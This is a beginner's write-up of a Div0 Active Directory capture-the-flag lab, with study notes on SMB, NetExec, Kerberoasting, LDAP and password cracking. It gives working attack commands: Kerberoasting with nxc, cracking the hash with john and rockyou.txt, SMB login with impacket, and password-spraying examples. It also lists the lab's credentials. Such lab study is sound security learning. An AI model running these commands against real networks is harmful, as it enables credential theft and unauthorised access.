# Range Village x Div0 September 25

This is my first div0 event I am attending and as a complete and absolute noob, I am going to try my hand at a writeup on what I did and learn during the event.

This writeup will be very beginner like so there will be alot of theory that I add at the bottom of the writeup for my own sake.

This writeup will also contain parts of the official writeup provided by Div0. I will add onto the parts where I feel that I need more research on.

Maybe pros can comment and point out some mistakes I may have made in this writeup. 

You can view the official writeup provided by Div 0 [here](https://blog.async.sg/rv-sept)!

## Chall 1: And so it begins

> As mentioned in the rules, the following credentials are provided for the antennae.rv domain:
>
> chloe.lim  
> BZCJsopuOPgH 
>
> The first flag is located in an SMB share on dc01.antennae.rv, in a file named flag1.txt.

[What is SMB?](#smb)

Luckily, the officiators provided a page for beginners. 

>This page is dedicated for newcomers to testing Active Directory environments. As you'd expect, this page will contain massive spoilers for the lab. Before beginning the lab, the following entries should be added to **/etc/hosts** to facilitate DNS resolution:
>
>10.3.10.10   dc01.antennae.rv    antennae.rv
>
>10.3.10.11   sql01.antennae.rv
>
>10.3.10.12   dc02.backward.rv    backward.rv
>
>10.3.10.13   srv01.backward.rv

To add the above entries to /etc/hosts, we have to first open /etc/hosts with root privileges:

> ~$ sudo vim /etc/hosts

Then just add everything to the file.

To verify that it works:

> ~$ ping -c 2 dc01.antennae.rv  
>
> ~$ ping -c 2 antennae.rv

Both should resolve to 10.3.10.10

An extremely important tool that you'll use for the majority of the lab (and on most internal pentests) is [**NetExec**](https://www.netexec.wiki/).

[What is NetExec? (nxc)](#nxc)

In this lab, there are 2 [forests](https://www.varonis.com/blog/active-directory-forest) - antennae.rv and backward.rv. In each forest, there will generally be at least 1 [domain controller](https://en.wikipedia.org/wiki/Domain_controller) that will be used to handle authentication and identity management in the forests.

[Active Directory Forest](#active-directory-forest)  
[Domain Controller](https://youtu.be/cTe5GsyhKUk?si=KvqJdu5vX98czdD5)

These domain controllers can usually be identified by the presence of the [Kerberos](https://en.wikipedia.org/wiki/Kerberos_(protocol)) service, or [LDAP](https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap). We can test these with nxc:


[Kerberoasting](#kerberoasting)  
[LDAP](#ldap)

> ~$ nxc ldap dc01.antennae.rv 
>
>LDAP        10.3.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv)

> ~$ nxc ldap dc02.backward.rv 
>
> LDAP        10.3.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv)

If we run this against any of the other member servers, you will find that LDAP is not open.

> ~$ nxc ldap sql01.antennae.rv

The following credentials were provided for a user in the antennae.rv forest, which is often referred to as an [assumed breach model](https://trustedsec.com/blog/assumed-breach-the-evolution-of-offensive-security-testing).

> ~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH'
>
>LDAP        10.3.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv)
>
>LDAP        10.3.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH

So through this we know that the given credentials in the challenge are valid.

> ~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --users

This showed me that svc_vdi and svc_sql are **service accounts**

[What is Active Directory Service Account?](#active-directory-service-account)

Next I want to use chloe.lim to attempt to kerberoast the service accounts:

> ~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --kerberoasting output.txt

This returns a hash into the output.txt file.

#### Decrypting the Hash

Looking into /usr/share/wordlists, there are multiple txt files including: john.txt and rockyou.txt.gz which is compressed

We also do not have write permissions to the rockyou.txt.gz file. So we copy it to our ~ directory to decompress it.

> ~$ gunzip rockyou.txt.gz

This decompresses the file and gives me rockyou.txt in my root directory.

> ~$ john --wordlist=rockyou.txt output.txt

This decrypts the hash to give me a password

Password :tr4v15  

However I don't know which user to use for this password, so to find out, we just ldap both users.

> ~$ nxc ldap dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15' --users
>
> ~$ nxc ldap dc01.antennae.rv -u 'svc_sql' -p 'tr4v15' --users

Then, assessing the outputs (red or green) I determine that the user that works is svc_vdi.

#### Getting the flag

Generally to login, people use smbclient, however it cannot do active directory logins which is what we want.

To do so, we have to use smbclient.py  
To use it, we run it by impacket-smbclient

> impacket-smbclient --help (to find the commands we can use)

> impacket-smbclient username@domain 
>
> impacket-smbclient svc_vdi@dc01.antennae.rv

Now we are in, and we can type help for a list of commands. 

* shares - to list available shares
* use {sharename} - connect to a specific share

There are specific Active Directory Windows default share, so we need to find the shares that are not included by default, it is very likely the flag is in there.

> ls

Then we run ls to list out the files in the share and we find flag1.txt

> cat flag1.txt
>
>RV{roAStIn6_1IkE_n0_7OMOrroW_e8cac89a3efd99b6c843857ac8faa276}



# Conclusions

Overall, I learnt quite alot from the event and this writeup. Having gotten exposed to Active Directory and then personally went on to research the basic concepts of most elements that are considered in Active Directory is decently fun. 

At the start, AD was mind boggling to think about (and I am sure it will continue to be), but as I understood more and more about the fundamental idea behind AD forests and its vulnerabilities, I see how an attacker may think to try and exploit it.

My research on fundamental topics are listed below, feel free to take a look!









### SMB
>Server Message Block (SMB) is a Network Communication Protocol that enables shared access to files, printers and serial ports.

Interesting note, SMB is heavily integrated into Windows OS (_Common Internet File System_ [_CIFS_]) and it allowed **multiple** users to access shared resources over a network.

#### How does it work?

1. The client initiates a session with the server using a transport protocol
2. The server then establishes an SMB session 
3. The server asks for authentication from the client and then verifies if it's valid
4. Now the client asks for access to a specific shared resource
5. The server checks if the client has the permissions and privileges for that resource. If yes, access is granted.
6. The server will provide the client with a list of commands to read, write, get, use, etc. The client can prompt help to see the list of commands
7. Data is transferred using SMB encapsulated network packets
    * SMB2/3 runs over TCP (port 445/tcp)
    * How the encapsulation looks:
        * Ethernet -> IP -> TCP -> SMB2/3
    * > Frame 42: 138 bytes on wire 
    * > **Ethernet II**, Src: 00:0c:29:ab:cd:ef, Dst: 00:50:56:12:34:56
    * > **Internet Protocol Version 4**, Src: 192.168.1.10, Dst: 192.168.1.20
    * > **Transmission Control Protocol**, Src Port: 49155, Dst Port: 445
    * > **SMB2 Protocol**
    * >Command: NEGOTIATE

8. The client sends a command to end the session

### NXC

NXC is a network exploitation framework for Active Directories and Internal Network Pentesting. It is the successor of CrackMapExec (CME).

The [NXC documentation](https://www.netexec.wiki/) is very good and most of the information here is a summary from that website, so it is highly suggested to refer to the website.

> nxc <protocol> <target(s)> -u username -p password

NXC supports multiple protocols:
* SMB → file shares, SAM/LSA dump, command execution

* RDP → credential brute-force & connection testing

* WinRM → command execution, PowerShell remoting

* LDAP → user/group/domain enumeration in AD

* MSSQL → database authentication & queries

* SSH → testing creds, executing commands

* FTP, VNC, HTTP → additional modules for testing

#### What can it do?
* Credential Stuffing / Password Spraying
    * It's like shooting a machine gun of credentials and passwords and seeing which one hits

    * > nxc smb 192.168.1.101 -u user1 user2 user3 -p Summer18

    * >nxc smb 192.168.1.101 -u user1 -p password1 password2 password3

    * By default nxc will exit after a successful login is found. 

    * Using the --continue-on-success flag, it will continue spraying even after a valid password is found. 

    * Useful for spraying a single password against a large user list.

* Authentication checks
    * You can authenticate on the remote target using a domain account or a local user
 
    * When authentication fail => [-] **COLOR RED** 

    * When authentication success => [+] **COLOR GREEN**

    * When authentication fail but the password provided is valid => **COLOR MAGENTA**

* Remote Command Execution
    * This is useful for using smb/ldap commands for example. 
    * Instead of using smbclient which in this challenge will not work as you will face some client side restrictions. 

### Active Directory Forest

[This video](https://youtu.be/7xOUsirYLYU?si=0p1fXTXwSfubh52z) has helped me understand Active Directory Forest alot, so give it a look!

To understand what is an Active Directory Forest, we have to first understand what are domains, trees and forests in the active directory.

For example, _hackerbearisawesome.com_ is a domain. We can think of it as a box. There are domain administrators that have rights to the domain and **only** the domain itself.

(_There are enterprise administrators who have admin rights to the entire forest_)

Now lets imagine we have a child domain called _uk.hackerbearisawesome.com_

Likewise there are domain admins that have rights to that domain, but they **do not** have access to the parent domain nor do the parent to the child.

The parent and child domains have trust relationships, which allow our domains to share resources. 

Now all of a sudden with a parent and child domain, we have one tree and one forest! 

> [hackerbearisawesome.com]  
> | (trust relationship)  
> [uk.hackerbearisawesome.com]

**This is not just one tree!**

We will only have multiple trees when we have a namespace change, so if we have another parent domain called: _hackerbotter.com_, it links with _hackerbearisawesome.com_ to form a trust relationship as well.

**Now we have 2 trees!**

![Example of Active Directory Forest](<Screenshot 2025-09-09 at 12.36.55 AM.png>)
Taken from the video mentioned above.

The great thing about ADF is that when created, every domain can share:
* Resources
* Schema (Object Templates and Attributes)

However, if the forests are not originally created together (i.e. 2 companies merging), we can still form a trust relationship between the two forests, but they can only share the same resources but not schema.

Domains of the same forest will also share the Global Catalogue, which allows for domains to search for objects in other domains.

### Kerberoasting

[Kerberoasting](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/#:~:text=Kerberoasting%20is%20a%20post%2Dexploitation,Service%20Principal%20Name%20(SPN).) is an attack that gets hashed credentials of the Active Directory Service Account.

> ~$ nxc [protocol] [domain] -u 'user' -p 'password' --kerberoasting output.txt 

This command lets you log in as an authenticated user and request a Kerberos ticket for a Service Principal Name (SPN)

What is [Service Principal Name (SPN)](#service-principal-name-spn)?

The Kerberos Ticket is an encrypted hash of the password of the Service Account. To decrypt it, we can use any number of methods like John/Jack the ripper, rockyou.txt (old and leaked passwords) and many more. 

What is [John the ripper](#john-the-ripper) and other password crackers?

I have tried using CyberChef to decrypt the hash but it is not the tool to use for this.

Kerberos hashes are encrypted with a secret key, as Kerberos uses symmetric key encryption. To learn more about Kerberos, you can watch [this](https://youtu.be/5N242XcKAsM?si=4uIIrqsd3Uzpiy_G), or read [this](https://en.wikipedia.org/wiki/Kerberos_(protocol)) and [this](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/#:~:text=Kerberoasting%20is%20a%20post%2Dexploitation,Service%20Principal%20Name%20(SPN).).



### LDAP

LDAP (Lightweight Directory Access Protocol) is used for directory services authentication. We use this protocol to communicate with other directory services servers. 

LDAP is a way of speaking to Active Directory.

What is LDAP Authentication?  
There are 2 options of authentication used in LDAP:
* Simple Authentication
    * Anonymous Authentication
    * Unauthenticated Authentication
        * Logging only, should not grant access to a client
    * Name / Password Authentication
        * Grants access to the server if credentials are correct
* Security Layer


### Active Directory Service Account

A service account is account that is used by services and not people. They are used to:
* Run applications and services 
* Access resources
* Automate Processes

So you can really start to see that it is quite valuable to attack a service account when trying to breach an AD.

Here is the [microsoft documentation](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-on-premises) on service accounts.

### Service Principal Name (SPN) 

A Service Principal Name (SPN) is a unique identifier of a service instance. They enable Kerberos authentication without needing to type credentials.


#### Format

> serviceclass/hostname:port
* serviceclass: HTTPS, LDAP, etc


[Documentation here](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names). 


### John The Ripper

A way to brute force and crack password hashes. 

#### Format
> john --wordlist=/usr/share/wordlists/rockyou.txt output.txt  

Uses rockyou.txt to crack output.txt. Rockyou.txt are a list of passwords that were previously leaked in a massive scandal. It feels kind of dubious to use them nowadays but I guess some beginner ctf challenges will use it.

Show cracked passwords:
> john --show hashes.txt  

Incremental mode:
> john --incremental hashes.txt

Specify hash type:
john --format=NT hashes.txt

[Documentation](https://www.openwall.com/john/doc/)

